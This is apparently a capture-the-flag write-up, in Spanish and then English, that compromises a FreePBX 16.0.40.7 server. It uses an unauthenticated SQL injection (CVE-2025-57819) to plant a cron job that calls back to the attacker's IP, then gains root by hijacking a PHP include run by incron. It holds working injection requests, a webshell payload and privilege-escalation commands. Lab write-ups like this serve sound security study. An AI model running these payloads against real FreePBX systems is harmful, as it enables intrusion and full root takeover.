Resumen de Explotación

Resumen del proceso: La máquina objetivo ejecutaba un servicio FreePBX versión 16.0.40.7 detrás de un Apache sobre CentOS, accesible en los puertos 80 y 443. El servicio resultó ser vulnerable a CVE-2025-57819, una inyección SQL en el endpoint /admin/ajax.php del módulo de endpoint, la cual permite ejecutar queries SQL arbitrarias sin autenticación.

Aprovechando esta SQLi, fue posible insertar un registro malicioso en la tabla cron_jobs de FreePBX. Este cronjob ejecutaba periódicamente un comando de reverse shell mediante busybox nc, lo que proporcionó acceso inicial como el usuario asterisk. La espera fue algo superior al minuto esperado del intervalo del cron, pero acabó funcionando sin problemas.

Para la escalada de privilegios, se identificó el servicio incrond ejecutándose como root, el cual monitoriza cambios en ficheros específicos del sistema. Uno de los triggers observaba el fichero /usr/local/asterisk/ha_trigger — que tenía permisos de escritura para cualquier usuario — y al detectar escritura ejecutaba el script /usr/sbin/sysadmin_ha. Este script PHP incluía un fichero (incron.php) que no existía en una ruta bajo el control del usuario asterisk. Creando dicha estructura de directorios y el fichero con una clase PHP maliciosa que ejecutaba chmod +s /bin/bash, bastó con escribir en ha_trigger para que incrond disparase el script como root, otorgando SUID a /bin/bash y permitiendo obtener una shell de root con bash -p.

Tecnologías/Exploits: FreePBX 16.0.40.7 SQLi no autenticada (CVE-2025-57819), inyección de cronjob vía SQL para RCE, escalada de privilegios mediante abuso de incron file watch con PHP include hijacking.

Enumeración Web - FreePBX

Al inspeccionar los puertos 80 y 443, descubro que la máquina ejecuta un servicio FreePBX versión 16.0.40.7 (https://github.com/freepbx). FreePBX es una interfaz web de código abierto para gestionar sistemas de telefonía Asterisk, bastante popular en entornos empresariales.

Investigación de Vulnerabilidades - CVE-2025-57819

Investigando esta versión específica de FreePBX, descubro que está afectada por CVE-2025-57819, una vulnerabilidad de inyección SQL que permite ejecutar queries SQL arbitrarias sin autenticación. En las condiciones adecuadas, esta SQLi puede traducirse en ejecución remota de código (RCE).

Encuentro una PoC en GitHub (https://github.com/MuhammadWaseem29/SQL-Injection-and-RCE_CVE-2025-57819) y un artículo detallado en el SANS ISC (https://isc.sans.edu/diary/32350), que explican tanto la vulnerabilidad como la cadena de explotación completa.

Confirmando la Inyección SQL

El endpoint vulnerable se encuentra en /admin/ajax.php, específicamente en el módulo de endpoint. El parámetro brand es inyectable. Para confirmar la vulnerabilidad, utilizo la técnica EXTRACTVALUE para extraer datos mediante error-based SQLi:

bash 
curl -i -k "https://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT('~USER:',(SELECT+USER()),'~'))+--+"

La respuesta del servidor confirma la inyección:

plaintext 
HTTP/1.1 500 Internal Server Error
Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
X-Powered-By: PHP/7.4.16
Content-Type: application/json

{"error":{"type":"Exception","message":"SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~USER:freepbxuser@localhost~'","file":"\/var\/www\/html\/admin\/libraries\/utility.functions.php","line":123}}

Se puede ver claramente en la respuesta de error el usuario de MySQL: freepbxuser@localhost, confirmando que la inyección SQL funciona correctamente.

Acceso Inicial - De SQLi a RCE vía Cronjobs

El artículo del SANS ISC detalla una técnica para convertir esta SQLi en RCE. FreePBX gestiona cronjobs a través de la base de datos, mediante la tabla cron_jobs. Insertando un registro malicioso en esta tabla, podemos hacer que FreePBX ejecute comandos arbitrarios cuando el cron se dispare.

PoC del Artículo

La PoC original inserta un cronjob que crea un archivo PHP con un webshell básico:

http 
GET /admin/ajax.php?module=FreePBX\modules\endpoint\ajax&command=model&template=x&model=model&brand=x' ;INSERT INTO cron_jobs (modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order) VALUES ('sysadmin','takdak','echo "PD9waHAg..."|base64 -d >/var/www/html/rspgf.php',NULL,'* * * * *',30,1,1) --

El payload en base64 decodificado es:

php 
<?php header('x_poc: CVE-2025-57819'); echo shell_exec('uname -a'); unlink(__FILE__); ?>

Esto crea un fichero PHP a modo de webshell que ejecuta uname -a como demostración. Sin embargo, para nuestros propósitos podemos usar una aproximación más directa.

Verificación de RCE

Antes de enviar una reverse shell, verifico que el mecanismo de cronjobs funciona insertando un job sencillo que realice un wget a mi máquina:

Escalada de Privilegios - Abuso de Incron

Analizando automatismos, crons y otras tareas recurrentes, descubro el servicio incrond ejecutándose como root:

plaintext 
root 754 0.0 0.0 15044 1120 ? Ss 11:08 0:00 /usr/sbin/incrond

incron es un demonio similar a cron, pero en lugar de ejecutar tareas basándose en tiempo, las ejecuta cuando se detectan eventos del sistema de ficheros (mediante inotify). Es decir, monitoriza cambios en ficheros y directorios y ejecuta comandos cuando se producen.

Analizando los Triggers de Incron

Examino la configuración de incron para ver qué ficheros monitoriza:

bash 
[asterisk@connected ~]$ cat /etc/incron.d/legacy
/var/spool/asterisk/sysadmin/vpnget                    IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
/var/spool/asterisk/sysadmin/intrusion_detection_stop   IN_CLOSE_WRITE /etc/init.d/fail2ban stop
/var/spool/asterisk/sysadmin/update_system_cron         IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
/var/spool/asterisk/sysadmin/portmgmt_setup             IN_CLOSE_WRITE /usr/sbin/sysadmin_portmgmt
/var/spool/asterisk/sysadmin/wanrouter_restart          IN_CLOSE_WRITE /usr/sbin/sysadmin_wanrouter_restart
/var/spool/asterisk/sysadmin/dahdi_restart              IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
/usr/local/asterisk/ha_trigger                          IN_CLOSE_WRITE /usr/sbin/sysadmin_ha

Cada línea define: un fichero a monitorizar, un evento (IN_CLOSE_WRITE = se cierra un fichero después de escribir en él), y un comando a ejecutar cuando se detecta el evento. Todos estos comandos se ejecutan como root, ya que incrond corre como root.

Identificando el Vector de Ataque

Compruebo los permisos del fichero ha_trigger:

bash 
[asterisk@connected ~]$ ls -lah /usr/local/asterisk/ha_trigger
-rwxrwxrwx. 1 asterisk asterisk 0 Jun 7 15:44 /usr/local/asterisk/ha_trigger

El fichero tiene permisos rwxrwxrwx — ¡cualquier usuario puede escribir en él! Esto significa que puedo disparar el evento IN_CLOSE_WRITE simplemente escribiendo en este fichero, lo que hará que incrond ejecute /usr/sbin/sysadmin_ha como root.

Analizando el Script sysadmin_ha

Veamos qué hace el script que se ejecuta:

php 
#!/usr/bin/php -q
<?php

if(file_exists("/var/www/html/admin/modules/freepbx_ha/license.php")) {
    include_once("/var/www/html/admin/modules/freepbx_ha/license.php");
}

$i = "/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php";
if (file_exists($i)) {
    require_once($i);
    $incron = new incron;
    $incron->rootTrigger();
}

Este script PHP es muy interesante. Intenta incluir el fichero /var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php y, si existe, instancia la clase incron y llama al método rootTrigger(). Todo esto se ejecuta como root gracias a incrond.

Creando el Payload PHP

La clave está en que la ruta /var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php no existe en el sistema, pero el directorio /var/www/html/admin/modules/ pertenece a nuestro usuario asterisk, por lo que podemos crear toda la estructura de directorios y el fichero PHP a nuestro antojo.

Creo la estructura de directorios necesaria y el fichero incron.php con una clase maliciosa:

bash 
mkdir -p /var/www/html/admin/modules/freepbx_ha/functions.inc/

Y escribo el contenido del fichero PHP:

php 
<?php

class incron {
    public function rootTrigger() {
        shell_exec('chmod +s /bin/bash');
    }
}

Esta clase define el método rootTrigger() que el script sysadmin_ha invocará. El comando chmod +s /bin/bash establece el bit SUID en /bin/bash, lo que nos permitirá ejecutar bash como root.

Disparando el Trigger

Con todo preparado, solo queda escribir en el fichero monitorizado para que incrond dispare la cadena:

bash 
touch /usr/local/asterisk/ha_trigger

El comando touch escribe en el fichero (actualiza su timestamp), lo que genera el evento IN_CLOSE_WRITE. Esto hace que incrond ejecute /usr/sbin/sysadmin_ha como root, el cual incluye nuestro incron.php malicioso y llama a rootTrigger(), que establece el bit SUID en /bin/bash.

Verifico que ha funcionado:

bash 
[asterisk@connected ~]$ ls -la /bin/bash
-rwsr-sr-x. 1 root root 964536 Apr  1  2020 /bin/bash

¡El bit SUID (s) está activo! Ahora ejecuto bash -p para obtener una shell con privilegios de root, consiguiendo así la flag del sistema y completando la máquina.

bash 
[asterisk@connected ~]$ bash -p
[root@connected ~]# whoami
root

Exploitation Summary

Exploitation process: The target machine was running a FreePBX service version 16.0.40.7 behind Apache on CentOS, accessible on ports 80 and 443. The service turned out to be vulnerable to CVE-2025-57819, a SQL injection in the /admin/ajax.php endpoint of the endpoint module, which allows executing arbitrary SQL queries without authentication.

By leveraging this SQLi, it was possible to insert a malicious record into FreePBX's cron_jobs table. This cronjob periodically executed a reverse shell command via busybox nc, providing initial access as the asterisk user. The wait was slightly longer than the expected one-minute cron interval, but it worked without issues.

For privilege escalation, the incrond service was identified running as root, monitoring filesystem changes on specific files. One of the triggers watched the file /usr/local/asterisk/ha_trigger — which had world-writable permissions — and upon detecting a write event, it executed the /usr/sbin/sysadmin_ha script. This PHP script included a file (incron.php) that didn't exist on a path controlled by the asterisk user. By creating the directory structure and the file with a malicious PHP class that executed chmod +s /bin/bash, all that was needed was to write to ha_trigger so that incrond would fire the script as root, granting SUID to /bin/bash and allowing a root shell via bash -p.

Technologies/Exploits: FreePBX 16.0.40.7 unauthenticated SQLi (CVE-2025-57819), cronjob injection via SQL for RCE, privilege escalation via incron file watch abuse with PHP include hijacking.

Web Enumeration - FreePBX

Inspecting ports 80 and 443, I discover that the machine is running FreePBX version 16.0.40.7 (https://github.com/freepbx). FreePBX is a popular open-source web interface for managing Asterisk telephony systems, widely used in enterprise environments.

Vulnerability Research - CVE-2025-57819

Researching this specific version of FreePBX, I discover it is affected by CVE-2025-57819, an SQL injection vulnerability that allows executing arbitrary SQL queries without authentication. Under the right conditions, this SQLi can be escalated to remote code execution (RCE).

I find a PoC on GitHub (https://github.com/MuhammadWaseem29/SQL-Injection-and-RCE_CVE-2025-57819) and a detailed article from SANS ISC (https://isc.sans.edu/diary/32350), which explain both the vulnerability and the full exploitation chain.

Confirming the SQL Injection

The vulnerable endpoint is located at /admin/ajax.php, specifically in the endpoint module. The brand parameter is injectable. To confirm the vulnerability, I use the EXTRACTVALUE technique for error-based SQL injection:

bash 
curl -i -k "https://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT('~USER:',(SELECT+USER()),'~'))+--+"

The server response confirms the injection:

plaintext 
HTTP/1.1 500 Internal Server Error
Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
X-Powered-By: PHP/7.4.16

The MySQL user freepbxuser@localhost is clearly visible in the error response, confirming the SQL injection works.

Initial Access - From SQLi to RCE via Cronjobs

The SANS ISC article details a technique to turn this SQLi into RCE. FreePBX manages cronjobs through its database, via the cron_jobs table. By inserting a malicious record into this table, we can make FreePBX execute arbitrary commands when the cron fires.

Article PoC

The original PoC inserts a cronjob that creates a PHP file with a basic webshell:

http 
GET /admin/ajax.php?module=FreePBX\modules\endpoint\ajax&command=model&template=x&model=model&brand=x' ;INSERT INTO cron_jobs (modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order) VALUES ('sysadmin','takdak','echo "PD9waHAg..."|base64 -d >/var/www/html/rspgf.php',NULL,'* * * * *',30,1,1) --

The base64 payload decodes to:

php 
<?php header('x_poc: CVE-2025-57819'); echo shell_exec('uname -a'); unlink(__FILE__); ?>

This creates a PHP webshell-like file that executes uname -a as a proof of concept. However, for our purposes we can use a more direct approach.

Verifying RCE

Before sending a reverse shell, I verify that the cronjob mechanism works by inserting a simple job that performs a wget to my machine:

http 
POST /admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+;INSERT+INTO+cron_jobs+(modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order)+VALUES+('sysadmin','test','wget+10.10.15.180',NULL,'*+*+*+*+*',30,1,1)--+ HTTP/1.1

The response is an expected error, since the injected query doesn't return valid data for the PHP view:

json 
{"error":{"type":"Whoops\\Exception\\ErrorException","message":"Trying to access array offset on value of type bool","file":"\/var\/www\/html\/admin\/modules\/endpoint\/views\/model.php","line":144}}

This error is perfectly normal — the important thing is that the INSERT statement was executed in the database. I set up a listener on port 80 and after a short while I receive confirmation:

plaintext 
10.129.17.43 - - "GET / HTTP/1.1" 200 -

It takes slightly longer than the expected minute from the cron interval (* * * * *), but it works. This confirms I have remote code execution.

Privilege Escalation - Incron Abuse

Analyzing automated tasks, crons, and other recurring processes, I discover the incrond service running as root:

plaintext 
root 754 0.0 0.0 15044 1120 ? Ss 11:08 0:00 /usr/sbin/incrond

incron is a daemon similar to cron, but instead of executing tasks based on time, it triggers them when filesystem events are detected (via inotify). In other words, it monitors changes on files and directories and runs commands when they occur.

Analyzing Incron Triggers

I examine the incron configuration to see which files it monitors:

bash 
[asterisk@connected ~]$ cat /etc/incron.d/legacy
/var/spool/asterisk/sysadmin/vpnget                    IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
/var/spool/asterisk/sysadmin/intrusion_detection_stop   IN_CLOSE_WRITE /etc/init.d/fail2ban stop
/var/spool/asterisk/sysadmin/update_system_cron         IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
/var/spool/asterisk/sysadmin/portmgmt_setup             IN_CLOSE_WRITE /usr/sbin/sysadmin_portmgmt
/var/spool/asterisk/sysadmin/wanrouter_restart          IN_CLOSE_WRITE /usr/sbin/sysadmin_wanrouter_restart
/var/spool/asterisk/sysadmin/dahdi_restart              IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
/usr/local/asterisk/ha_trigger                          IN_CLOSE_WRITE /usr/sbin/sysadmin_ha

Each line defines: a file to monitor, an event (IN_CLOSE_WRITE = a file is closed after being written to), and a command to execute when the event is detected. All these commands run as root, since incrond runs as root.

Identifying the Attack Vector

I check the permissions on the ha_trigger file:

bash 
[asterisk@connected ~]$ ls -lah /usr/local/asterisk/ha_trigger
-rwxrwxrwx. 1 asterisk asterisk 0 Jun 7 15:44 /usr/local/asterisk/ha_trigger

The file has rwxrwxrwx permissions — any user can write to it! This means I can trigger the IN_CLOSE_WRITE event simply by writing to this file, which will cause incrond to execute /usr/sbin/sysadmin_ha as root.

Analyzing the sysadmin_ha Script

Let's see what the triggered script does:

php 
#!/usr/bin/php -q
<?php

if(file_exists("/var/www/html/admin/modules/freepbx_ha/license.php")) {
    include_once("/var/www/html/admin/modules/freepbx_ha/license.php");
}

$i = "/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php";
if (file_exists($i)) {
    require_once($i);
    $incron = new incron;
    $incron->rootTrigger();
}

This PHP script is very interesting. It attempts to include the file /var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php and, if it exists, instantiates the incron class and calls the rootTrigger() method. All of this runs as root thanks to incrond.

Crafting the PHP Payload

The key insight is that the path /var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php doesn't exist on the system, but the directory /var/www/html/admin/modules/ belongs to our asterisk user, so we can create the entire directory structure and PHP file as we wish.

I create the necessary directory structure and the incron.php file with a malicious class:

bash 
mkdir -p /var/www/html/admin/modules/freepbx_ha/functions.inc/

And write the PHP file content:

php 
<?php

class incron {
    public function rootTrigger() {
        shell_exec('chmod +s /bin/bash');
    }
}

This class defines the rootTrigger() method that the sysadmin_ha script will invoke. The chmod +s /bin/bash command sets the SUID bit on /bin/bash, which will allow us to run bash as root.

Firing the Trigger

With everything in place, all that's left is to write to the monitored file so that incrond fires the chain:

bash 
touch /usr/local/asterisk/ha_trigger

The touch command writes to the file (updates its timestamp), which generates the IN_CLOSE_WRITE event. This causes incrond to execute /usr/sbin/sysadmin_ha as root, which includes our malicious incron.php and calls rootTrigger(), setting the SUID bit on /bin/bash.

I verify it worked:

bash 
[asterisk@connected ~]$ ls -la /bin/bash
-rwsr-sr-x. 1 root root 964536 Apr  1  2020 /bin/bash

The SUID bit (s) is set! Now I run bash -p to obtain a root shell, getting the system flag and completing the machine.

bash 
[asterisk@connected ~]$ bash -p
[root@connected ~]# whoami
root
